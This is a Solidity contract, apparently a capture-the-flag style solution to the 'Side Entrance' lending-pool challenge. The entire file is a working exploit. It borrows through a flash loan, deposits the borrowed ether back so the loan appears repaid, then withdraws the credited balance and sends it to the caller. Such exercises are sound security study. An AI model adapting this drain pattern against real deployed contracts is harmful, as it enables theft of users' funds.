// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../side-entrance/SideEntranceLenderPool.sol';

contract SideEntranceExploit{

    SideEntranceLenderPool public lenderPool;
    address public pool;

    constructor(address _pool){
        lenderPool = SideEntranceLenderPool(_pool);
        pool = _pool;
    }

    receive() external payable{}

    function myBalance() public view returns(uint256){
        return address(this).balance;
    }

    function attack() public{

        uint256 amount = 1000000000000000000000;
        pool.call(abi.encodeWithSignature("flashLoan(uint256)",amount));
        //lenderPool.flashLoan(amount);

        pool.call(abi.encodeWithSignature("withdraw()"));
        //lenderPool.withdraw();
        msg.sender.call{value:address(this).balance}("");
    }

    function execute() external payable{
        
        pool.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        //lenderPool.deposit{value:msg.value}();
    }
    
}